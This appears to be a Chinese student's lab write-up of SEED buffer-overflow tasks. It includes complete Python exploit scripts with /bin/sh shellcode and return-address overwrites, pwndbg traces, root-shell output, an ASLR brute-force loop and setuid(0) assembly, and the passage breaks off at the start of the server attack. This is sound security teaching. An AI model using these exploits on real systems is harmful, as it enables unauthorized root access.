<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffcd98</span> + <span class="number">96</span>           <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">112</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><strong>执行漏洞程序，获取到root权限shell</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit.py                                    </span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span> </span><br></pre></td></tr></table></figure>

<h3 id="Task4：对未知buffer大小的程序进行攻击"><a href="#Task4：对未知buffer大小的程序进行攻击" class="headerlink" title="Task4：对未知buffer大小的程序进行攻击"></a>Task4：对未知buffer大小的程序进行攻击</h3><p>由于buffer大小未知，可以考虑喷射方法，将payload前若干项全部修改为要返回的地址，由于给定限定条件buffer大小位于100到200，所以可以考虑在前200+4项全部覆盖为ret_addr。这样总会将ebp地址覆盖为要返回的地址。</p>
<p>选择攻击stack-L2，首先进行gdb调试，获取ebp地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b bof</span></span><br><span class="line">Breakpoint 1 at 0x1221: file stack.c, line 20.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Input size: 517</span><br><span class="line"></span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &#x27;\220&#x27; &lt;repeats 112 times&gt;, &quot;\020\316\377\377&quot;, &#x27;\220&#x27; &lt;repeats 84 times&gt;...) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc7f0 ◂— 0x205</span><br><span class="line">*EIP  0x56556221 (bof+20) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x56556221 &lt;bof+20&gt;    sub    esp, 8</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    lea    edx, [ebp - 0xa8]</span><br><span class="line">   0x5655622d &lt;bof+32&gt;    push   edx</span><br><span class="line">   0x5655622e &lt;bof+33&gt;    mov    ebx, eax</span><br><span class="line">   0x56556230 &lt;bof+35&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x56556235 &lt;bof+40&gt;    add    esp, 0x10</span><br><span class="line">   0x56556238 &lt;bof+43&gt;    mov    eax, 1</span><br><span class="line">   0x5655623d &lt;bof+48&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x56556240 &lt;bof+51&gt;    leave  </span><br><span class="line">   0x56556241 &lt;bof+52&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 </span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc7f0 ◂— 0x205</span><br><span class="line">01:0004│     0xffffc7f4 ◂— 0x0</span><br><span class="line">02:0008│     0xffffc7f8 —▸ 0xffffc884 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc7fc ◂— 0x0</span><br><span class="line">04:0010│     0xffffc800 —▸ 0xf7db68a0 (step0_jumps) ◂— 0x0</span><br><span class="line">05:0014│     0xffffc804 ◂— 0xffffffff</span><br><span class="line">06:0018│     0xffffc808 —▸ 0xf7c1aac9 ◂— &#x27;ld-linux.so.2&#x27;</span><br><span class="line">07:001c│     0xffffc80c —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x56556221 bof+20</span><br><span class="line">   1 0x56556348 dummy_function+58</span><br><span class="line">   2 0x565562e0 main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br></pre></td></tr></table></figure>

<p>利用此信息进行喷射攻击。构造python脚本如下</p>
<p><code>exploit.py</code>：将payload前208项全部覆盖为ret地址，ret地址需要大于等于$ebp+232。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffc898</span> + <span class="number">232</span>        <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">207</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">52</span> </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果获取到root权限的shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L2.py</span><br><span class="line">❯ ./stack-L2</span><br><span class="line">Input size: <span class="number">514</span></span><br><span class="line"><span class="comment"># whoami                                                                       </span></span><br><span class="line">root</span><br><span class="line"><span class="comment">#  </span></span><br></pre></td></tr></table></figure>

<h3 id="Task5：针对64位程序的攻击"><a href="#Task5：针对64位程序的攻击" class="headerlink" title="Task5：针对64位程序的攻击"></a>Task5：针对64位程序的攻击</h3><p>64位程序与32位程序类似，但是由于地址前4位均为0，如果直接输入会导致strcpy函数遇<code>\x00</code>截断，导致shellcode无法进栈，因此可以考虑通过将shellcode放在ret前。python脚本构造如下：</p>
<p><code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">40</span>            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffd5b0</span>+<span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">208</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>((ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获得root权限shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L3.py</span><br><span class="line">b&#x27;\x8c\xd6\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">❯ ./stack-L3</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br></pre></td></tr></table></figure>

<h3 id="Task6：攻击64位程序（buffer很小）"><a href="#Task6：攻击64位程序（buffer很小）" class="headerlink" title="Task6：攻击64位程序（buffer很小）"></a>Task6：攻击64位程序（buffer很小）</h3><p>由于buffer size变小，不足以插入shellcode，可以考虑利用在main函数中参数中出现的shellcode。gdb调试如下，记录shellcode的所在地址，令<code>ret=0x7fffffffdca0 + 220</code>，即可成功跳转到shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 70</span></span><br><span class="line">00:0000│ rsp 0x7fffffffdab0 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L4-dbg&#x27;</span><br><span class="line">01:0008│     0x7fffffffdab8 ◂— 0x100000000</span><br><span class="line">02:0010│     0x7fffffffdac0 ◂— 0x9090909090909090</span><br><span class="line">03:0018│     0x7fffffffdac8 ◂— 0x9090909090909090</span><br><span class="line">04:0020│     0x7fffffffdad0 ◂— 0x7fffffffd6909090</span><br><span class="line">05:0028│     0x7fffffffdad8 ◂— 0x9090909090900000</span><br><span class="line">06:0030│     0x7fffffffdae0 ◂— 0x9090909090909090</span><br><span class="line">... ↓        55 skipped</span><br><span class="line">3e:01f0│     0x7fffffffdca0 ◂— 0x622fb84852d23148</span><br><span class="line">3f:01f8│     0x7fffffffdca8 ◂— 0x485068732f2f6e69 (&#x27;in//shPH&#x27;)</span><br><span class="line">40:0200│     0x7fffffffdcb0 ◂— 0x48e689485752e789</span><br><span class="line">41:0208│     0x7fffffffdcb8 ◂— 0x9090050f3bb0c031</span><br><span class="line">42:0210│     0x7fffffffdcc0 ◂— 0x7f9090909090</span><br><span class="line">43:0218│     0x7fffffffdcc8 ◂— 0x64 /* &#x27;d&#x27; */</span><br><span class="line">44:0220│     0x7fffffffdcd0 ◂— 0x20500001000</span><br><span class="line">45:0228│     0x7fffffffdcd8 —▸ 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>python脚本如下</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="number">7</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffdca0</span> + <span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">10</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获取root权限下的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L4.py</span><br><span class="line">❯ ./stack-L4</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>    </span><br></pre></td></tr></table></figure>

<h3 id="Task-7：Defeating-dash’s-Countermeasure"><a href="#Task-7：Defeating-dash’s-Countermeasure" class="headerlink" title="Task 7：Defeating dash’s Countermeasure"></a>Task 7：Defeating dash’s Countermeasure</h3><p>输入命令改回设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo ln -sf /bin/dash /bin/sh</span><br></pre></td></tr></table></figure>

<p>修改call_shellcode.c，将setuid的汇编代码加入到shellcode中，重新编译并运行，可以发现shell具有root权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make setuid</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">sudo chown root a32.out a64.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">sudo chmod 4755 a32.out a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br><span class="line">❯ ./a64.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>setuid（0）汇编语言如下，可见主要操作为将real uid设置为0，即root用户的uid，这样当bash执行文件时会发现real id与拥有者id一致，因此不会限制权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Invoke setuid(0): 32-bit</span><br><span class="line">xor ebx, ebx ; ebx = 0: setuid()’s argument</span><br><span class="line">xor eax, eax</span><br><span class="line">mov al, 0xd5 ; setuid()’s system call number</span><br><span class="line">int 0x80</span><br><span class="line">; Invoke setuid(0): 64-bit</span><br><span class="line">xor rdi, rdi ; rdi = 0: setuid()’s argument</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 0x69 ; setuid()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<h3 id="Task-8-Defeating-Address-Randomization"><a href="#Task-8-Defeating-Address-Randomization" class="headerlink" title="Task 8: Defeating Address Randomization"></a>Task 8: Defeating Address Randomization</h3><p>在32位机器上，由于栈比较小，可以通过暴力破解的方式来攻破ASLR地址随机化。</p>
<p>运行命令重新开启ASLR机制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br><span class="line">kernel.randomize_va_space = 2</span><br></pre></td></tr></table></figure>

<p>尝试攻击stack-L1，可以发现报错，由于ASLR随机了栈基址，导致ret的值失效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L1.py</span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line">[1]    12494 segmentation fault (core dumped)  ./stack-L1</span><br></pre></td></tr></table></figure>

<p>使用暴力破解的方式来尝试攻击，运行脚本，由于随机性较强，没有解出：</p>
<img src="/posts/637eab0b/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-setuid.png" class="" title="暴力破解">

<p>暴力破解脚本如下，主要执行了循环进行攻击的操作。</p>
<p><code>brute_force.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 1 ))</span><br><span class="line">  duration=$SECONDS</span><br><span class="line">  min=$(($duration / 60))</span><br><span class="line">  sec=$(($duration % 60))</span><br><span class="line">  echo &quot;$min minutes and $sec seconds elapsed.&quot;</span><br><span class="line">  echo &quot;The program has been running $value times so far.&quot;</span><br><span class="line">  ./stack-L1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h3 id="Task-9：Experimenting-with-Other-Countermeasures"><a href="#Task-9：Experimenting-with-Other-Countermeasures" class="headerlink" title="Task 9：Experimenting with Other Countermeasures"></a>Task 9：Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 9.a: Turn on the StackGuard Protection</strong>  </p>
<p>开启StackGuard防护。使用gcc命令重新编译stack-L1，尝试进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ./stack</span><br><span class="line">Input size: 517</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[1]    19472 IOT instruction (core dumped)  ./stack</span><br></pre></td></tr></table></figure>

<p>可以发现，stack smashing detected，表明检测到栈溢出，自动停止程序运行。</p>
</li>
<li><p><strong>Task 9.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p>开启DEP防护，重新编译a32out，a64out，查看结果，发现无法弹出shell，说明数据段中代码不可执行，无法成功攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ gcc -DBUF_SIZE=100 -m32 -o a32.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ gcc -DBUF_SIZE=100 -m64 -o a64.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ sudo chmod 4755 a32.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">❯ sudo chmod 4755 a64.out</span><br><span class="line">❯ sudo chown root a32.out</span><br><span class="line">❯ sudo chown root a64.out</span><br><span class="line">❯ ./a64.out</span><br><span class="line">[1]    25967 segmentation fault (core dumped)  ./a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">[1]    26060 segmentation fault (core dumped)  ./a32.out</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="stack-overflow-Server"><a href="#stack-overflow-Server" class="headerlink" title="stack-overflow(Server)"></a>stack-overflow(Server)</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<p>漏洞程序分析，程序中bof函数存在漏洞，原理同stack-overflow(setuid)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str); P</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"><span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">bof(str);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -DSHOW_FP -z execstack -fno-stack-protector -static -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=180 -z execstack -fno-stack-protector -static -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=80 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../bof-containers</span><br><span class="line">cp stack-* ../bof-containers</span><br></pre></td></tr></table></figure>

<p>建立docker镜像：</p>
<img src="/posts/637eab0b/docker.png" class="" title="docker">

<h3 id="Task-1：Get-Familiar-with-the-Shellcode"><a href="#Task-1：Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1：Get Familiar with the Shellcode"></a>Task 1：Get Familiar with the Shellcode</h3><p>shellcode基本原理为执行命令”&#x2F;bin&#x2F;sh”，从而获取shell</p>
<p>shellcode_32.py, shellcode_64.py运行，编译call_shellcode.c，运行文件，执行codefile</p>
<img src="/posts/637eab0b/shellcode.png" class="">

<p>修改shellcode_32.py，使其codefile可以删除文件（shellcode_64同理）：</p>
<img src="/posts/637eab0b/%E4%BF%AE%E6%94%B9shellcode.png" class="" title="修改shellcode">

<h3 id="Task-2：Level-1-Attack"><a href="#Task-2：Level-1-Attack" class="headerlink" title="Task 2：Level-1 Attack"></a>Task 2：Level-1 Attack</h3><p>使用<code>echo hello | nc 10.9.0.5 9090</code>命令连接server1 9090端口，建立TCP连接后服务端会自动运行stack程序。</p>
<img src="/posts/637eab0b/%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1nc.png" class="" title="测试服务nc">

<p>根据ebp地址和buffer地址，构造python脚本如下：</p>
